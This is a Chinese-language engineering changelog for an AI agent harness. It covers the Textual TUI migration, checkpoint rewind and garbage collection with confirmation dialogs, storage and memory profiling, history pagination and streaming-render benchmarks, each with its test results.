`ruff check .` 通过。**刻意未做**：对 `exec_policy` / `documents` / `hooks` 整体
`ruff format` —— 保持移动代码逐字不变，且符合 `ruff.toml` 的增量格式化约定；
新文件按需在后续改动中逐步收敛。
## P6：textual 默认切到新 TUI

`HARNESS_UI=textual` 过去仍加载旧 `ui_textual.py`，新 `src/ui/harness_app.py` 只能靠
`textual-next` 试验。现在路由反过来：

| 值 | 实现 |
|---|---|
| `ansi`（默认） | 行式 REPL |
| `textual` | `src/ui/harness_app.py`（行模型 + 虚拟视口） |
| `textual-next` | 同上，兼容旧脚本/配置 |
| `textual-legacy` | `ui_textual.py` 旧实现，仅对照 |

`entrypoint._interactive_lock()` 对三种 Textual 模式都释放交互锁，避免 worker 与
cron 争锁；`--ui` 的 choices 同步增加 `textual-legacy`。新 app 启动/渲染失败仍会
捕获异常回退 ANSI，不会把终端留在半初始化状态。

**验证**：`tests/test_entrypoint.py` 覆盖三种模式的锁、`tests/test_cli_output.py`
确认 `textual` 进入新 app；定向 76 passed。真实终端 checklist（Windows Terminal /
PowerShell / VS Code 终端）仍待人工验收。
## TUI 迁移：/checkpoint /rewind /undo

新 TUI 之前只迁了 `/checkpoints`（只读列表），快照写操作和回滚仍要切 ANSI。现在补齐：

- `/checkpoint [label]`：调用 `CheckpointManager.begin_turn(..., trigger='manual')`
  后立即 `seal()`；忙碌时拒绝，避免在工具调用中间拍快照；
- `/rewind [ID|last|head] [--force] [--session] [--yes]`：
  1. `command_error` 先校验参数；
  2. `resolve` + `snapshot_path` 检查快照存在；
  3. `plan_restore` 只预览，不落盘；有冲突且无 `--force` 时直接拒绝；
  4. 默认弹 `ConfirmModal`（`y`/Enter 确认，`n`/Esc 取消），`--yes` 才跳过；
  5. 执行走既有 `harness.rewind_to`，保留 append-only rewind 事件、文件恢复和
     `messages[:]` 替换；随后 `_reload_transcript()` 清空块模型并按新历史重建；
- `/undo` = `/rewind last --yes`，与 ANSI 行为一致；
- `ConfirmModal` 是独立 modal，不依赖审批门；报告里的 ANSI 色码统一剥离；
- 忙碌中拒绝回滚；回滚失败（快照缺失/`ok=False`/异常）只显示通知，不改内存历史。

**测试**：`/checkpoint` 参数与 seal、`/rewind` 预览 + y 确认、n 取消保持历史、
`/undo` 参数校验；命令注册表确认四条命令 `ported=True`。定向 56 passed。

## TUI 迁移：剩余 slash 命令与 /tree 评估

新 TUI 之前仍有 `/archive` `/delete` `/find` `/workspaces` `/workspace`
`/cd` `/watch` `/revoke` `/more` 只能回 ANSI 使用。本次全部接入，注册表 39 条
命令均为 `ported=True`：

- **交互分层（对照 Pi）**：Pi 没有这些命令，但其 `ctx.ui.select` / 自定义
  selector 的做法可以复用——命令只负责准备数据，选择/确认交给通用 modal：
  - `ChoiceModal`：搜索 + 单选（`/find` 命中会话、`/workspace remove` 登记项）；
  - `CleanupPickerModal`：多选归档/恢复/删除，空格勾选、F2/Ctrl+A 全选可见项、
    Enter 确认；筛选后保留已勾选项；
  - `TypedConfirmModal`：删除必须原样输入“删除”，空回车只提示、不执行。
- **共享语义**：`session_cleanup_plan` / `apply_session_cleanup`、
  `add_workspace_from_argument` / `remove_workspace_selector` 下沉到
  `harness.py`；行式 REPL 与 TUI 共用，避免“同名命令两套行为”。
- **线程边界**：归档/删除的扫描与执行、`/find` 搜索、`/watch` 跟踪都在后台
  线程；扫描/执行期间 `redirect_stdout`，防止旧的 print 覆盖 Textual 屏幕。
- **/watch**：`watch_command` 增加 `emit` 注入，REPL 仍传 `print`，TUI 把进度
  写进同一个 notice 块（只保留最近 8 行），结束时替换为完整输出。
- **/new --ws**：支持已登记工作区的序号/名称/路径；未登记的绝对或相对目录
  仍可直接使用，和旧 REPL 一致。
- **/tree 不实现**：项目真相源是 append-only 事件流，文件回滚由
  checkpoint/rewind 负责，历史分叉由 `/fork` 负责；Pi 的消息树是另一套模型。
  两套同时存在会让“当前历史”出现两个定义。保留 `/fork` 选择器 + `/rewind`
  作为等价路径，结论写入 `docs/UI_REWRITE_PLAN.md`。

**测试**：新增 `/find` 搜索→选择→恢复、`/archive` 全选→确认→执行、
`/delete` 短语确认、`/workspaces` `/workspace remove` `/cd`、
`/new --ws`、`/watch` emit 与 TUI 状态块测试；命令迁移相关 177 passed，
全量 1188 passed / 1 skipped，`ruff check .` 通过。两条旧断言
（“仍有命令仅在行式 REPL”）随 39 条全部迁移更新为“全部已迁移”。

**刻意未做**：暂不删除 `ui_textual.py`（留一版真实终端对照，验收后再删）；
不引入 `/tree`；未对 legacy 文件做整体格式化，遵守 `ruff.toml` 的增量格式化约定。

## feature/ui 收尾审查：任务互斥、迟到结果与命令兼容

检查已提交的 P6/快照迁移及工作区内尚未提交的剩余命令迁移，修复以下问题：

- **任务期间切换上下文**：阻止 `/new`、`/resume`、`/sessions`、`/fork`、
  `/clone`、`/cd` 改变活跃任务的会话与工作区；恢复回调也再次检查忙碌状态。
  恢复工作区失败时保持原会话，切换成功后清理旧状态与文件补全缓存。
- **本地操作期间的消息丢失/并发**：shell、压缩和会话清理标记独立操作类型，
  此时普通输入进入 follow-up，不进入无人消费的 steering；操作结束或清理失败后
  继续排队请求。清理确认时再次检查后台整理状态，阻止执行期间切换活跃会话。
- **迟到选择器**：搜索/归档扫描的 notice 已随会话切换清除时，丢弃扫描结果；
  清理扫描结束时若已有请求运行，提示稍后重试，不再弹出清理选择器。
- **命令覆盖不完整**：补 `/checkpoint-gc`、`/resume last`、行式命令别名及
  `/approvals <序号> y|n`；对比两套注册表的测试防止漏项。当前为 40 条 TUI 命令。
- **交互收尾**：目录候选只回填；`/new --ws` 支持引号包围的路径；
  多选 Ctrl+A 在搜索框中也可用，筛选保留勾选；用户标题按纯文本展示；
  确认报告滚动显示，避免长预览挤掉提示；清空视图后 shell 结束仍能解除忙碌状态。
- **后台 stdout**：归档扫描通过 `emit` 注入诊断输出，清理执行不重定向全局
  stdout，避免与其他线程的输出重定向嵌套。行式 REPL 默认仍使用 print。

回归覆盖真实 checkpoint 文件恢复、外部改动冲突、强制恢复、rewind 事件重放、
清理成功/失败后队列处理、忙碌时切换拦截、过期扫描、多选筛选、长预览与目录补全。

**验证**：主套件 1200 passed / 1 skipped（主机不支持 symlink），5 条 warning
均为飞书 SDK 的 pkg_resources 弃用提示；入口/CLI/UI 集成/旧 UI/MCP 联合回归
97 passed；Ruff 与 git diff --check 通过。联合回归发现非 TTY 输出测试依赖
renderer 的导入顺序，已隔离事件渲染回调后复测通过。
10k 块布局 27.3ms、滚动 0.797ms/帧、流式更新 1.694ms。

**尚未完成**：Windows Terminal / PowerShell / VS Code 真实终端验收、P7 重复实现清理、
合并 main。检查清单已写入 UI_REWRITE_PLAN；自动测试通过不代表这些步骤完成。

## TUI 自绘视口选区修复

用户反馈 Markdown 显示后无法拖选。根因不是 Markdown 格式，而是自绘
`VirtualTranscript.render_line` 绕过了默认渲染管线：没有给 strip 添加文本 offset
元数据，也没有根据 text_selection 绘制高亮或实现 get_selection。
此前 Ctrl-C 回归 mock 了 _selected_text，不能证明鼠标选择链路有效。

修复：每个真实内容段通过 Strip.apply_offsets 标记文档行和字符偏移，沿用
Textual 对终端 cell 与 Unicode 字符的映射；选中行按字符范围叠加主题高亮，
从布局行提取纯文本，不复制 Markdown 标记或终端补齐空白。
普通行继续缓存，选中状态不写入缓存，清除选区后不会留下旧高亮。
窗口换宽后清除基于旧布局的选区，防止复制错位。

新增真实鼠标 down/move/up 回归，覆盖中文与 emoji 正反向拖选、选区高亮及清除、
滚动后的代码块跨行复制、Ctrl-C 不退出、Ctrl-Shift-C、越界与换宽。
复制出口仍用测试回调捕获，系统剪贴板通过 OSC 52 的实际写入仍待终端验收。

验证：对话/生命周期/布局/选区/UI 集成定向回归 79 passed；旧 UI/MCP 回归
67 passed；增量 Ruff 通过。
10k 块布局 25.5ms、滚动 0.685ms/帧、流式更新 1.448ms。
该基准测布局计算，不代表真实终端选区渲染或系统剪贴板性能。

## TUI 拖选即复制与行尾空白

按用户交互要求，拖选后松开鼠标即复制到剪贴板，仍保留显式复制快捷键。
复制在刷新后读取最终选区；单击和仅选中行尾空白不覆盖剪贴板。
Rich 代码面板渲染行自身带有行尾填充，先前 get_selection 把这些空白计入
复制文本，导致字符数偏大。现在逐行去除尾部空格/tab，保留行首缩进、正文
内部空格与换行，清除结尾空行；提示计数使用实际复制字符串长度。
这也会去掉源代码有意保留的行尾空格；完整工具原始输出仍可通过 /copy 获取。

验证：选区/新 TUI/生命周期/布局 78 passed；增量 Ruff 通过。
新增真实代码面板拖选测试验证自动复制、行尾清理、缩进与计数，及单击/空白
选择不覆盖剪贴板。系统剪贴板在真实终端的写入仍待人工验收。

## 复制计数口径修正

用户继续反馈计数偏大。复现居中 H1：Heading 为 7 个字母，80 列布局提取后
仍带 36 个前导空格，len 为 43；上一轮仅清理行尾，仍将布局左填充、缩进和
换行纳入提示数字。统一自动复制、Ctrl-C/Ctrl-Shift-C 与 /copy 的提示为
non-whitespace chars，使用 Unicode isspace 排除空白，复制内容保留原有结构。
这是非空白 Unicode 码点数，不是字节数或终端列数。
新增 60/100 列居中标题真实拖选回归，确保提示恒为 7，同时验证工具复制口径。
回归还暴露退出期间视口脱离 screen 后读取选区导致 NoScreen，增加挂载检查。
验证：选区/新 TUI/生命周期/布局 80 passed；增量 Ruff 通过。

## TUI 队列交互：Enter/Alt+Enter 对调与选择器管理

用户提出队列需要可选的取回与删除，并把 Enter 定义为“进入队列”、Alt+Enter
定义为“立刻入队”。据此明确交互契约：

- 忙时 Enter 进入 follow-up 队列，本回合结束后处理；Alt+Enter 进入 steering，
  Agent 下一次消费时注入当前回合。空闲时两者都直接发送，不额外排队。
- Ctrl+G、Alt+↑ 或 `/dequeue` 打开 `QueueModal`：↑↓ 选择、Enter 取回单条、
  Ctrl+R 取回全部、Delete/Ctrl+D 删除选中项（ConfirmModal 二次确认）、Esc 关闭。
  只有一条消息时 Ctrl+G 直接取回，省去一次确认。F2 与部分系统/终端快捷键冲突，
  已从队列与归档多选界面移除（后者保留 Ctrl+A）。
- 取回把消息追加到现有草稿之后并保留多行内容；删除只移除队列项，不写入历史。
- Esc 取消回合仍取回全部未消费消息，行为和之前一致。

实现上，`PendingQueue.take_at(index, expected=text)` 在锁内校验预期文本再弹出。
弹窗打开后 Agent 可能消费 steering，队列位置会前移；如果不校验，旧行可能误取
到下一条消息。`QueueModal` 只返回动作和值，App 再用打开时的行快照核对。
删除键不绑定裸字母 `d`，避免搜索框无法输入；列表获得焦点后使用 Delete/Ctrl+D。

新增 `tests/test_ui_queue.py`：Enter/Alt+Enter 分流、单条直接取回、选择器
↑↓ 单条取回、删除确认/取消、已消费行的过期保护。同时更新旧队列测试以打开
选择器后按 Ctrl+R 取回全部。

验证：队列/新 TUI/生命周期/命令/补全定向回归 95 passed；随后队列 7 passed；
完整 UI 回归 188 passed；全量 1214 passed / 1 skipped（主机不支持 symlink），
5 条 warning 均为飞书 SDK 弃用提示；增量 Ruff 通过。
真实终端中的 Ctrl+G、Delete 与 Alt+Enter 仍需按验收表检查。

## checkpoint-gc 全局回收与试运行

用户反馈 `/checkpoint-gc` 显示“无需清理”。检查后确认不是删除失败：`gc()` 只扫描
当前会话目录，且只在节点数超过 `CHECKPOINT_MAX_NODES=20` 时删除最旧的非 head、
非 label 节点；本机 `.cache/checkpoints` 实际有 21 个会话、1243 个节点，旧会话
从未被这条命令覆盖。当前会话不足 20 个节点时提示“无需清理”是正确的，但缺少
“其他会话还有多少”的上下文。

实现调整：

- `CheckpointManager.gc_plan()` 只计算计划并给出节点体积，`gc()` 复用计划删除；
  `gc(max_nodes=N)` 允许命令层覆盖保留上限，不改变 manager 的长期配置。
- `checkpoints.gc_all_checkpoints(dry_run=True)` 遍历每个会话目录，按同样的
  head/label 规则试运行，返回会话数、节点数、待删数量、释放字节和明细；
  `dry_run=False` 才真正删除。`checkpoint_counts()` 用于报告其他会话存量。
- `/checkpoint-gc` 默认只处理当前会话，并提示其他会话待清理量；
  `/checkpoint-gc --all` 先展示预览，TUI 弹 `ConfirmModal`、行式 REPL 用 `_confirm`，
  确认后才执行；`--keep N` 覆盖每会话保留上限。命令参数校验同步到
  `cli_commands` 与 TUI 命令元数据。
- 不做隐式自动清理；删除旧 checkpoint 会切断旧回溯链，必须由用户确认。

本机只读 dry-run：21 个会话、1243 个节点，按每会话保留 20 个可回收 931 个
（约 92.99MB），其中 12 个会话有可回收项，耗时约 1 秒。没有执行删除。

新增测试：`gc_plan` 不改盘、全局 dry-run/执行、跨会话按保留上限、label 保留、
`--keep` 解析与错误、TUI `--all` 取消/确认/校验、格式化中的其他会话提示。
验证：checkpoint/TUI/生命周期/命令/补全定向 134 passed；随后 checkpoint 45 passed
（含行式 REPL 的 --all 取消/确认）；全量 1220 passed / 1 skipped，5 条 warning
均为飞书 SDK 弃用提示；增量 Ruff 通过。

补充：`--keep` 只影响当次命令，清理不会自动执行，也不改变默认保留策略。
参数补全改为上下文感知：`--all ` 继续提示 `--keep 10/20/50/100`，`--keep `
提示数字并保留前面的参数；同时补 `/cache gc <天数> ` 的 `--apply` 和
`/watch <id> --timeout ` 的 30/60/300。新增复合参数补全测试，全量 1223 passed。

## Agent 存储/内存 profile 与清理边界调研

**问题**：`.cache` 同时放会话、快照、工具大输出、transcript、记忆、任务、API 日志和
未知目录；已有 `/cache gc`、`/checkpoint-gc`、`/archive`、`/delete` 四条清理路径，
但没有一个总览能回答“哪里占空间、哪些真的可删、哪些不能动”。直接做全量自动 GC
又会把恢复源和派生缓存混在一起。

**调研**：

- Pi（本机 v1.3.0）：session 是 append-only JSONL；恢复选择器只扫描 header；
  `Ctrl+D` 删除优先调用 `trash`，失败才 `unlink`；compaction 追加摘要并保留原始
  entries；图片默认按约 2000×2000 / 4.5 MiB 编码上限缩放；prompt cache warming
  是供应商缓存策略，不是磁盘 GC；没有启动时自动删旧会话。
- Codex CLI（本机 0.162.1）：活动 `sessions/` 与 `archived_sessions/` 分开；提供
  显式 `codex archive/unarchive/delete`；rollout 可为 `.jsonl.zst`，历史可迁移为
  分页 SQLite thread history；SQLite 使用 WAL/`auto_vacuum=INCREMENTAL`；
  `codex doctor` 报告 rollout 文件数/字节、DB 完整性和一致性，但不自动删除。
- 两者共同点：**历史保留与派生缓存分离，删除显式化，先诊断后操作**。

**做法**：

- 新增 `src/storage_profile.py`：把 `.cache` 分为源数据（sessions/memories/tasks/
  os_tasks/导出）、派生缓存（tool_results/checkpoints）、临时/诊断目录和未识别目录；
  统计文件数/字节/最早时间，工具缓存调用 `tool_cache.plan_cleanup` 计算引用保护后的
  可回收量，快照调用 `gc_all_checkpoints(dry_run=True)` 计算按会话保留策略的可回收量。
- `/cache profile` 输出完整 profile；`/cache gc` 保持原有“工具缓存按天 + 引用保护”的
  预览/执行语义；`/checkpoint-gc` 保持按会话保留策略；会话仍只通过 `/archive`、
  `/delete` 处理。未识别目录只报告，不自动删除。
- `--doctor` 增加 storage 摘要（浅扫描，不计算引用/快照计划）。
- `scripts/profile_storage.py` 支持 `--json` 和 `--session largest`：用 `tracemalloc`
  测量读取事件、重建 OpenAI 历史的当前/峰值内存。
- 内存缓存加界：session summary 512、project instructions 256、Markdown Console 16 个宽度；
  TUI 行缓存和审批缓存沿用已有上限。

**本机只读 profile**：`.cache` 约 75 MB；可识别 29.0 MB（sessions 9.0 MB / 46 文件、
checkpoints 17.2 MB / 177 节点、transcripts 1.8 MB 等），未识别 42.4 MB
（`dsh-im-reference`，只报告）。最大 session 约 4.9 MB：读取约 88 ms、重建历史约 152 ms，
当前约 11.7 MB、峰值约 22.9 MB。此前 `--keep 10` 使 21 个会话各保留 10 个节点；
默认仍是每会话 20，故当前快照可回收量为 0。

**暂不做**：不自动删除会话/记忆/导出/未知目录；不在启动时全量 GC；不按目录年龄删除
无引用证据的数据；暂不引入 rollout zstd 压缩或分页存储，先用真实 profile 决定是否需要。

验证：storage/TUI/命令/tool_cache 定向 82 passed；全量 1228 passed / 1 skipped，
5 条 warning 均为飞书 SDK 弃用提示；`harness.py --doctor` 已输出 storage 摘要；
Ruff 与 diff 检查通过。

## 合并 feature/ui 到 main

合并前检查：main 无独有提交，feature/ui 领先 82 个提交，main 是共同祖先，
无冲突；工作区干净。以 `--no-ff` 生成合并提交 `bd99673`，把 Textual UI、
运行时接线、审批/策略/文档解析拆分、checkpoint 全局回收和存储 profile 一起合入。
合并后全量 1228 passed / 1 skipped，5 条 warning 均为飞书 SDK 弃用提示。

未完成项保留在文档中：三种真实终端的人工验收、P7 legacy 清理、默认 UI 从 ansi
切换到 textual 的独立决策。feature/ui 暂保留作验收回退，验收完成后再删除；
后续修复从 main 拉 `fix/ui-*`，不再在 feature/ui 上继续开发。

## P7：移除 legacy TUI 并切换默认 Textual 入口

P7 执行内容：

- 删除旧实现 `src/ui/app.py`（1614 行）和兼容壳 `ui_textual.py`；删除 `textual-legacy`
  的 CLI choice、`_interactive_lock` 分支和 `run_repl` 路由；`textual-next` 仅保留为
  旧环境变量的兼容别名。
- 默认交互入口改为 Textual（`HARNESS_UI` 未设置时），非 TTY、缺少 Textual 或驱动
  启动失败时回退 ANSI；`--ui ansi` / `HARNESS_UI=ansi` 仍可显式降级。
- 删除旧专属测试与旧实现断言：legacy TUI 端到端测试、旧 `CCApp` 测试、旧 session
  过滤测试；保留并迁移 cc_ui/事件桥/新 App 测试。`test_ui.py` 现在只保留 ANSI
  渲染测试。
- `run_repl` 的 ANSI 路径统一在 `agent_lock` 内运行，fallback 不再绕过锁；
  `agent_lock` 改为 RLock，允许入口与降级路径在同一线程安全重入。
- 新 Textual `run()` 在启动前取消订阅 ANSI 默认渲染器，退出时恢复，避免后台事件
  同时打印到屏幕；这也修复了全量测试顺序中 ANSI 渲染器泄漏导致 agent_loop 重复
  输出最终文本的问题（`on_delta` 存在时不再额外 print 正文）。
- 更新 README、开发流程、重构计划和验收记录的默认入口与 P7 状态。

验证：全量 `tests/` + 根目录 ANSI 测试 + MCP 回归 **1269 passed / 1 skipped**
（skip 为主机不支持 symlink；5 条 warning 均来自飞书 SDK 的 pkg_resources），
Ruff 与 diff 检查通过。ANSI 回退、Textual 默认入口、RLock 重入、renderer 切换和
旧测试删除后的顺序依赖均已覆盖。

## 长会话内存优化：事件缓存边界与流式重建

profile 显示最大会话（约 5 MB JSONL）完整读取事件峰值约 23 MB，同时 `messages`
还保存了一份重建历史。参考 Codex 的分页/按需历史读取和 Pi 只投影 active branch
的思路，不删除 append-only 源数据，改为收紧内存中的派生副本：

- `SessionEventStore.read_events()` 只缓存不超过 `HARNESS_EVENT_CACHE_MAX_BYTES`
  （默认 2 MiB）的文件；超限时返回结果但不保留完整事件表。
- `rebuild_openai_history()` 对超限会话走两遍流式扫描：第一遍收集
  `tool_compacted` 占位，第二遍构建 messages，避免先构造完整事件列表。
- `session_summary()` 单独按 `(size, mtime)` 缓存摘要；`append()` 使摘要缓存失效，
  长会话列表/标题查询不再为摘要保留整份事件。
- 新增 `iter_events()`，复用 JSONL 序号/尾部半行校验；小会话仍走原缓存路径。

实测最大会话：显式 `read_events()` 峰值约 22.9 MB；流式 rebuild 峰值约 **1.8 MB**、
当前约 0.5 MB，重建约 0.4 s。重建变慢约 0.2 s/次，是有意的内存换 CPU 折中；
小会话不受影响。新增测试覆盖超限不缓存、流式 compaction/placeholder、摘要缓存失效。

同时清理了误放在 `.cache` 的 `xmanrui/dsh-im` 公共 clone（42 MB，无本地改动，
HEAD `00e2683`）；当前 `.cache` 约 31 MB。验证：全量 **1271 passed / 1 skipped**
（skip 为主机不支持 symlink；5 条 warning 均来自飞书 SDK 的 pkg_resources），
新增流式重建/缓存边界测试通过，Ruff 与 diff 检查通过。

## UI 布局行缓存对比实验

基线（10000 块、每块 3 行、宽 100）：模型 5.8 MB，布局完整缓存 30000 行，
布局后当前约 9.6 MB、峰值约 10.1 MB，首次 layout 约 67.6 ms，视口切片约 7.4 ms。

改为有界缓存（默认 6000 行）后：离屏块保留 `height`、`lines=None`，`line_at`/
`visible` 按需重渲染；当前约 7.5 MB（降低约 22%）。进一步让全量构建边建边淘汰
（游标避免 O(n²)），峰值从约 10.1 MB 降到 **8.1 MB**，首次 layout 约 81.7 ms，
视口切片约 7.9 ms。流式更新改为从变更块重算 starts：旧的全表重排约 1.2 ms/次，
尾部流式块约 0.05 ms/次。10k 块基准 `scripts/bench_ui.py` 仍远低于阈值。

新增 `scripts/bench_layout.py` 同时跑 full/bounded 两种模式，避免只看单边数字；
新增缓存淘汰/高度保持测试、流式尾部更新 starts 回归；验证：全量
**1273 passed / 1 skipped**，5 条 warning 均来自飞书 SDK，Ruff 与 diff 检查通过。若后续继续压低峰值，需要把块高度也改为
惰性估算，或参考 Codex 的分页 history / Pi 的 active-branch projection 做真正的窗口化。

## UI 历史分页实验

全量 10,000 条消息的启动基线：UI 块/布局行 10000，`run_test` 就绪约 10.9 s，
当前内存约 18.1 MB、峰值约 27.8 MB。这与 Codex 的 paginated thread history、
Pi 的 active-branch 投影一致：恢复源保留完整历史，但 UI 不应一次渲染全部。

实现：`HISTORY_INITIAL_MESSAGES=400`、`HISTORY_PAGE_MESSAGES=200`。
`_load_history()` 只把最近 400 条消息转成块，完整 `_messages` 仍给 Agent；
滚动到顶部（经过一次从非顶部到顶部的偏移变化）或 `/more` 调
`load_older_history()`，按页 prepend 并补偿滚动位置。`ConversationModel.prepend()`
支持前插；`/clear` 重置分页状态。

对比：10,000 条消息初始只加载 400 条后，就绪约 **0.57 s**、当前约 **2.3 MB**、
峰值约 **6.2 MB**；加载更早的 200 条后块数为 600。分页减少的是 UI/布局首屏成本，
不改 `_messages` 的 Agent 上下文，也不删除源历史。新增测试覆盖初始窗口、手动
前插两页和滚到顶部自动加载。验证：全量 **1276 passed / 1 skipped**，5 条 warning
均来自飞书 SDK，Ruff 与 diff 检查通过。

## 历史 snip 切断工具组导致会话无法恢复

现场错误：`Unable to resume: orphan tool result 'call_01_...' at message 4`。
定位到 `session_5b68...` 的 `history_snipped` 事件：`head_end=3, tail_start=6`
以及后续 `head_end=3, tail_start=11`，后者落在同一个 assistant 的 tool 结果组中间。
旧的回放代码直接执行
`messages[:head_end] + marker + messages[tail_start:]`，于是第二个 tool 结果
没有对应的 assistant tool_calls，`validate_openai_history` 报 orphan。

根因不是会话文件损坏，而是**历史压缩边界没有对工具组做回放级校验**。修复：

- 新增 `normalize_snip_bounds()`：头部若切在 assistant tool_calls 或工具结果
  组中间，向前并入完整组；尾部若落在无主工具结果上，向后跳过整组。
- 生成 `snip_compact` 和回放 `history_snipped` 共用该归一化，旧索引事件也能恢复。
- `snipped` marker 使用归一化后的实际数量。
- 新增历史坏边界回放测试，并验证受影响会话重新 `rebuild_openai_history()` 成功
  （该会话得到 247 条消息）。

这是“持久化压缩决策必须同时是恢复边界”的教训：只保证生成时合法不够，旧事件/
旧实现留下的索引在重放时也必须修复或拒绝。受影响会话重新回放得到 247 条消息；
新增坏边界测试，全量 **1276 passed / 1 skipped**。

## 流式渲染自适应节流

用户反馈终端流式输出还可以更快。测量显示 Rich Markdown 每帧成本随累计文本增长：
短回复约 2–5 ms，30k 字符约 15 ms，100k 字符约 60 ms。原实现固定 120 ms 才允许
下一帧，导致普通长度回复也只有约 8 fps。

改为 `STREAM_MIN_INTERVAL=0.05`、`STREAM_MAX_INTERVAL=0.30`：每次刷新记录实际
`refresh_layout` 耗时，下一帧间隔取 `max(50ms, 2 × cost)` 并封顶 300ms。短/中文
回复可到约 20 fps，长回复自动退让，避免固定节流把短文本也拖慢。新增
`scripts/bench_stream.py` 输出不同文本长度下的固定/自适应间隔；新增间隔自适应测试。
不改变 Markdown 最终排版或流式内容。验证：全量 **1277 passed / 1 skipped**，
5 条 warning 均来自飞书 SDK；Ruff 与 diff 检查通过。

## 快照语义对齐：turn 回退与 Pi/Codex 对照

用户确认快照的核心预期是「回到一轮对话开始前」。原实现节点按 loop 迭代生成，
`resolve('undo')` 实际是「最近一个有文件改动的节点」，因此可能落在回合中间；这
解释了为什么文件回退了，但不一定是整轮开始前的状态。

新增节点元数据 `turn_start`（仅 `trigger=turn` 且快照最后一条是 user 时置真），
并增加 `resolve('turn')`：

- `/rewind` 默认 `turn`：回到最近一个用户回合开始前的会话和文件；
- `/undo` = `/rewind turn --yes`；
- `/rewind last` 保留「只撤销最近文件改动」的旧语义；
- `/rewind head` 仍是最新节点；
- 老会话没有 `turn_start` 时，从 `messages.jsonl` 尾部读最后一条消息判断，兼容旧索引。

此外调研了 Pi/Codex：Pi 是 `id`/`parentId` 会话树，`/tree`/`/fork`/`/clone` 做强分支，
但没有等价的通用工作区文件快照；Codex 的 `ThreadRevertParams` 明确只替换会话历史、
不恢复本地文件，archive/delete 和分页 history 更成熟。对齐结论：保留我们的文件
pre-image 能力，不引入 Pi 的树模型；`turn` 默认化，`last` 保留为文件级撤销；bash、
记忆、cron、任务和 worktree 仍明确列为不可回滚副作用。详细对照见
`docs/CHECKPOINT_COMPARISON.md`。

验证：全量 **1278 passed / 1 skipped**，5 条 warning 均来自飞书 SDK；Ruff 与 diff 检查通过。

## 增量历史投影与对照实验

本轮实现正常追加路径的增量投影，保留完整回放作为复杂事件的唯一恢复算法。
`SessionEventStore` 保存当前消息的紧凑 JSON bytes 和待合并事件；普通追加不再重新
扫描旧事件，返回时解码独立消息树。压缩、snip、工具占位、tool_recovery、rewind
以及外部 size/mtime 变化均使缓存失效；回滚历史始终重查快照依赖。
投影与待合并事件的序列化预算合计 2 MiB，待合并列表最多 256 条；不缓存半截尾行。
首轮/新实例仍完整回放，因此不宣称所有 API 请求或首次打开会话都加速。

新增 `scripts/bench_projection.py`：临时目录里生成相同事件，交替完整回放与增量投影，
对照最后的历史逐条相等。6.1 MB 合成历史、压缩后追加 30 轮，中位耗时
92.12 ms → 0.21 ms；冷启动 74.05/79.45 ms，峰值约 6.21/6.17 MiB。
本机 5.2 MB 实际会话，重复读取 10 次、无 tracer：159.30 ms → 3.23 ms，
每次结果相等。测量不含模型调用，tracemalloc 不等于 RSS。

新增 10 个回归覆盖返回值嵌套修改隔离、增量追加不调用完整回放、压缩/裁剪/工具占位
失效、跨实例写入、同大小重写、恢复待处理工具只落一次事件、回溯快照缺失、缓存预算
和尾部半行。全量发现旧节流测试依赖真实 sleep，Windows 调度导致偶发失败；改用
确定时钟测试规则。最终全量 1288 passed / 1 skipped / 5 warnings；23 条最终存储
定向回归通过，增量 Ruff 与 diff 检查通过。

快照只读预览：22 个会话、191 个节点，keep=10 时可回收 4 个节点、13361 字节；
未执行删除。真实终端回合回退验收留作后续独立工作，
没有用自动测试冒充人工验收。

## 流式 Markdown：稳定前缀实验与最后一帧复用

用户要求提速且不能拖慢现有输出。先用 `scripts/bench_markdown_prefix.py` 测段落、
列表、代码围栏、表格/纯文本前缀拼接，逐行比对 Rich `Text.plain` 和 styles。结果发现
Rich 段落间距/嵌套列表不是简单可组合的行片段；朴素拼接出现不等价，安全版需要对
完整文本再渲染做校验，反而约慢 1.8–2 倍，故未引入前缀拼接。

采用低风险单帧复用：

- streaming assistant 的全量 Rich Markdown 输出保留为最多 1 个活动块的最后帧；
- `block_id + width + exact source text` 全等才复用，否则先释放旧帧再全量渲染；
- 限制单块 ≤100k 字符、≤10000 行；assistant 最终化命中后清空，历史重载/clear/卸载也清空；
- 正常首帧与内容变化仍执行一次原全量渲染，不拆 Markdown、不延后首 token、不降低排版质量。

对比脚本覆盖 plain、paragraph、list、fenced code、table：first/changed phase 的输出文本和
Rich spans 必须完全相等，应用路径只做一次全量解析；不同形状的计时受 Rich/解释器预热影响，
没有可证明的普遍加速，因此不把它宣称为流式 FPS 提升。unchanged final phase 命中缓存，
约 4k–20k 字符的样本复用耗时约 0.01ms，而重新解析约 10–400ms；收益只在 finalization，且不增加
正常流式帧的渲染工作。

新增 `tests/test_stream_frame_cache.py` 覆盖多种 Markdown 内容的 styles 相等、文本/宽度/块 id
变化失效、超限不缓存、重载释放。稳定前缀拼接仅留实验脚本，不进入产品。
验证：全量 **1298 passed / 1 skipped**，5 条 warning 均来自飞书 SDK；Ruff 与 diff 检查通过。

本轮新增受控代码围栏候选（`scripts/bench_stream_codeblocks.py`）：仅流式中间帧、且围栏有
语言标记时把 lexer 临时改为 `text`；无围栏/无语言标记保持 Rich 原路径，终帧
强制重渲染并恢复语法高亮。实际 `_render_block` 对照（600 行代码，5 次中位数）：
60/100 列分别由 **504/463ms 降至 110/108ms**；含未闭合围栏由 **485/468ms**
降至 **122/128ms**；无语言标记约 **103/104ms → 102/100ms**。逐行文本与换行相同，
终帧 Rich spans 完全相同；普通文本/列表/表格的无围栏检测不足 0.02ms。
真实终端复测尚未执行，不能将这些渲染基准当作终端交互验收。

## 长会话初载窗口调整

最新 10k 消息历史窗口基准在 Windows/Textual run_test 下有调度抖动。复测 400 条初载
中位约 1.19s；200 条初载的三次中位约 0.45s，当前/峰值 Python 分配约 2.0/6.0 MiB
（400 条约 2.3/6.1 MiB）。正式基准脚本的一次当前默认测量为 0.815s，落在重复样本
0.345–0.832s 区间；不把单次值作 SLA。将默认 `HARNESS_HISTORY_INITIAL_MESSAGES` 从 400
调为 200，与每页 200 条对齐。完整 `_messages` 仍保留，滚到顶部与 `/more` 仍按 200 条加载；
本变化只减少界面初始转换量，不触碰模型历史和流式 Markdown 输出。测试改为依据窗口配置验证。

存储 profile 约 29.6 MB；checkpoints 约 17.5 MB。对全局快照执行只读 dry-run：22 个会话、
191 个节点，`keep=5` 预计回收 92 个节点、8,625,056 字节。没有执行删除，等待用户明确确认。
全量性能回归基线：10k 块布局 36.5ms、滚动帧 1.61ms、流式尾部更新 0.85ms；100k 字符
